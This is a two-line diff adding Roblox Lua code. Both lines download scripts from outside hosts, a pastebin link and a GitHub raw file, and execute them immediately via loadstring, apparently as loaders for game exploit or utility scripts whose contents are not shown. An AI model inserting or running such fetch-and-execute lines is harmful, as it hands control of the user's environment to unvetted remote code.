@@ -1,0 +1,2 @@
+spawn(loadstring(game:HttpGet("https://pastebin.com/raw/zKjj0TQD", true)))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/anti-slow/main/dhm5", true))()
